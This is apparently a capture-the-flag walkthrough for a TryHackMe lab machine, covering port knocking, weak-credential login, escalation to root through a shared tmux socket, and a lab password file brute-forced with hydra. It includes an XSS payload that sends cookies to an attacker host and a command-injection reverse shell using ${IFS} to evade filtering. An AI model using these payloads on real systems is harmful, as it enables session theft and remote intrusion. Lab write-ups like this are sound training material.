# [Misguided Ghosts](https://tryhackme.com/room/misguidedghosts)

## Collaboration between Jake and Blob!

# Misguided Ghosts

## Deploy the machine and get root privileges.

### What is the user flag?

1. First, perform a port scan to identify open services on the target machine.

```bash
nmap -sV <TARGET_IP>
```

**Results:**

```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```

2. Attempt anonymous FTP login to check for publicly accessible files.

```bash
ftp <TARGET_IP>
anonymous
ls -la
cd pub
prompt off
mget *
```

Download all files from the FTP server for analysis.

**Content of info.txt:**

```
I have included all the network info you requested, along with some of my favourite jokes.

- Paramore
```

**Content of jokes.txt**

```
Taylor: Knock, knock.
Josh:   Who's there?
Taylor: The interrupting cow.
Josh:   The interrupting cow--
Taylor: Moo

Josh:   Knock, knock.
Taylor: Who's there?
Josh:   Adore.
Taylor: Adore who?
Josh:   Adore is between you and I so please open up!
```

The "knock, knock" jokes might be a hint about port knocking.

3. Open the `trace.pcapng` file in Wireshark and filter requests by the internal IP address `192.168.236.131` to identify suspicious network activity.

[SCREEN01]

4. By examining the TCP packets sent to various ports, we can extract a port knocking sequence. Look at the destination ports in chronological order.

Port sequence identified: `7864 8273 9241 12007 60753`

Execute the port knocking sequence to unlock a hidden service:

```bash
knock <TARGET_IP> 7864 8273 9241 12007 60753
```

**Note:** You may need to execute the knock command multiple times, as the knock utility sometimes sends packets out of order.

5. After successful port knocking, perform another port scan to identify newly opened services.

```bash
nmap -sV <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
8080/tcp open  ssl/http Werkzeug httpd 1.0.1 (Python 2.7.18)
```

A new HTTPS web service on port 8080 has been revealed.

6. Enumerate directories and files on the web server using Gobuster.

```bash
gobuster dir -u https://<TARGET_IP>:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt -t 50 -k
```

**Results:**

```
/login                (Status: 200) [Size: 761]
```

7. From the certificate details, we find the email address: `zac@misguided_ghosts.thm`.

8. Navigate to `https://<TARGET_IP>:8080/login` and try common weak credentials using the discovered username: `zac:zac`.

9. Start a simple HTTP server on your attacking machine to receive stolen cookies:

```bash
python -m http.server
```

10. The dashboard appears to have functionality to create posts. Create a new post with the following XSS payload in the Title or Subtitle field: `&lt;sscriptcript&gt;var i = new Image(); i.src = "http://<ATTACKER_IP>:8000/" + document.cookie;&lt;/sscriptcript&gt;`

[SCREEN03]

After submitting the post, monitor your HTTP server logs. When an admin views the post, their session cookie will be sent to your server.

11. Change the `login` cookie value to `hayley_is_admin` and refresh the page

12. Use Gobuster with the admin cookie to discover admin-only pages:

```bash
gobuster dir -t 50 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://<TARGET_IP>:8080 -c "login=hayley_is_admin" -k 2>/dev/null
```

**Results:**

```
/login                (Status: 302) [Size: 227] [--> https://<TARGET_IP>:8080/dashboard]
/photos               (Status: 200) [Size: 629]
```

A new `/photos` endpoint has been discovered that requires admin privileges.

13. Navigate to `https://<TARGET_IP>:8080/photos?image=.` to test for path traversal or command injection vulnerabilities. The page lists files in the current directory, confirming a Local File Inclusion (LFI) or directory traversal vulnerability.

[SCREEN04]

14. Prepare a listener on your attacking machine to catch the reverse shell:

```bash
nc -lvnp 4444
```

14. The `image` parameter appears vulnerable to command injection. Execute a reverse shell payload: `https://<TARGET_IP>:8080/photos?image=.;nc${IFS}<ATTACKER_IP>${IFS}4444${IFS}-e${IFS}/bin/sh`

`${IFS}` is used as a space replacement (Internal Field Separator) to bypass filtering

You should receive a reverse shell connection on port 4444.

15. Explore the user's home directory:

```bash
ls -la /home/zac/notes
cat /home/zac/notes/.secret
cat /home/zac/notes/.id_rsa
```

**Content of .secret:**

```
Zac,

I know you can never remember your password, so I left your private key here so you don't have to use a password. I ciphered it in case we suffer another hack, but I know you remember how to get the key to the cipher if you can't remember that either.

- Paramore
```

This note indicates that the RSA private key has been encrypted with a cipher.

**Content of .id_rsa:**

```
-----BEGIN RSA PRIVATE KEY-----
NCBXsnNMYBEVTUVFawb9f8f0vbwLpvf0hfa1PYy0C91sYIG/U5Ss15fDbm2HmHdS
CgGHOkqGhIucEqe4mrcwZRY3ooKX2uB8IxJ6Ke9wM6g8jOayHFw2/UPWnveLxUQq
0Z/g9X5zJjaHfPI62OKyOFPEx7Mm0mfB5yRIzdi0NEaMmxR6cFGZuBaTOgMWRIk6
aJSO7oocDBsVbpuDED7SzviXvqTHYk/ToE9Rg/kV2sIpt7Q0D0lZNhz7zTo79IP0
TwAa61/L7ctOVRwU8nmYFoc45M0kgs5az0liJloOopJ5N3iFPHScyG0lgJYOmeiW
QQ8XJJqqB6LwRVE7hgGW7hvNM5TJh4Ee6M3wKRCWTURGLmJVTXu1vmLXz1gOrxKG
a60TrsfLpVu6zfWEtNGEwC4Q4rov7IZjeUCQK9p+4Gaegchy1m5RIuS3na45BkZL
4kv5qHsUU17xfAbpec90T66Iq8sSM0Je8SiivQFyltwc07t99BrVLe9xLjaETX/o
DIk3GCMBNDui5YhP0E66zyovPfeWLweUWZTYJpRsyPoavtSXMqKJ3M4uK00omAEY
cXcpQ+UtMusDiU6CvBfNFdlgq8Rmu0IU9Uvu+jBBEgxHovMr+0MNMcrnYmGtTVHe
gYUVd7lraZupxArh1WHS8llbj9jgQ5LhyAiGrx6vUukyFZ8IDTjA5BmmoBHPvmbj
mwRx+RJNeZYT3Pl/1Qe8Uc4IAim3Y7yzMMfoZodw/g2G2qx4sNjYLJ8Mry6RJ8Fq
wf2ES1WOyNOHjQ2iZ1JrXfJnEc/hU1J3ZLhY7p6oO+DAd7m5HomDik/vUTXlS3u1
A1Pr4XRZW0RYggysRmUTqVEiuTIMY4Y0LhIbY/Vo8pg6OTyKL0+ktaCDaRXEnZBp
VU1ABBWoGPfXgUpEOsvgafreUVHnyeYru8n4L8WB/V7xUk56mcU6pobmD3g19T6n
ddocO8sVX6W8mhPVllsc6l+Xl4enJUmReXmXaiPiHoch1oaCgrYYmsONThM7QUut
oOIGdb6O/3qfZA+V+EIm3tP+3U/+RsurKmrpVIFWzRIRuj90aBhOzNBsAHloOlOB
LCuVjI5M6VuXJ+YY9M9biS2qafFUgIUaKYMVdzDtJFkMhACpJqpy+w6owW0hn3vA
H6gpsbnl3zm3ey0JMqnDbwWqKFWTU6DK8V5o6whXZJRXJb1Lxs38PiAry9TPRGVA
M5EY0XxjniOoesweDGHryeJNeZV9iRP/CAV0LGDx7FAtl3a7p3DGb2qz0FL6Dyys
vgh73EndW0xa6N8clLyA1/GR5x54h+ayGzMQa8d4ZdAhWl+CZMpTjqEEYKRL9/Xc
eXU3MNVuPeDrqdjYGg+4xXtSaLwSbOmGwH/aED2j4xxgraMo3Bp+raHGmOEex/RL
1nCbZKDUkUP3Cv8mc9AAVs8UN6O6/nZo1pISgJyPjuUyz7S/paSz04x7DjY80Ema
r8WpMKfgl3+jWta+es1oL6DtD9y7RD5u9RPSXGNt/3QwNu+xNlle39laa8UZayPI
VhBUH4wvFSmt0puRjBgE6Y5smOxoId18IFKZL1mko1Y68nLNMJsj
-----END RSA PRIVATE KEY-----
```

This is an encrypted RSA private key that needs to be decrypted.

16. The RSA key headers are standard, so we can attempt to brute-force the cipher key. Use [CyberChef](https://gchq.github.io/CyberChef/) to decrypt. Try to guess key letter by letter.

[SCREEN04]

17. Once decrypted, save the decoded RSA key to a `id_rsa` file:

```bash
chmod 600 id_rsa
```

The file permissions must be restricted or SSH will reject the key.

18. Use the decrypted private key to authenticate as zac:

```bash
ssh -i id_rsa zac@<TARGET_IP>
```

19. Check for internal services that aren't exposed externally. SMB (port 445) is running locally, create an SSH tunnel to access it:

```bash
ss -tulpn
ssh -i id_rsa -L 445:localhost:445 zac@<TARGET_IP>
```

20. List available SMB shares on the forwarded port:

```bash
smbclient -L localhost
```

**Results:**

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
local           Disk      Local list of passwords for our services
IPC$            IPC       IPC Service (misguided_ghosts server (Samba, Ubuntu))
```

21. Connect to the SMB share and retrieve the password file:

```bash
smbclient //localhost/local
ls
get passwords.bak
```

[SCREEN05]

22. Use the downloaded password list to brute-force SSH login for user hayley:

```bash
hydra -l hayley -P passwords.bak ssh://<TARGET_IP>
```

23. Login as hayley using the discovered password:

```bash
ssh hayley@<TARGET_IP>
#Password: aBc123!
```

24. Locate and read the user flag:

```bash
cat user.txt
```

[SCREEN06]

---

### What is the root flag?

1. Check running processes and interesting system directories:

```bash
ps aux
ls -lta /opt
```

**Results:**

```
total 16
drwxr-xr-x  4 root root     4096 Jan 22 15:26 .
srw-rw----  1 root paramore    0 Jan 22 15:26 .details
drwxr-xr-x 23 root root     4096 Aug 25  2020 ..
drwxr-xr-x  3 root root     4096 Aug 18  2020 xss
drwx--x--x  4 root root     4096 Aug 11  2020 containerd
```

Notice the `.details` socket file owned by root with group `paramore`.

2. The `.details` file is a Unix socket, likely for a tmux session. Tmux allows multiple users to share terminal sessions. If a root user has an active tmux session attached to this socket, we can hijack it:

```bash
tmux -S /opt/.details
```

This connects to the existing tmux session using the specified socket file.

3. Once inside the tmux session, verify privileges and capture the root flag:

```bash
whoami
cat /root/root.txt
```

[SCREEN07]
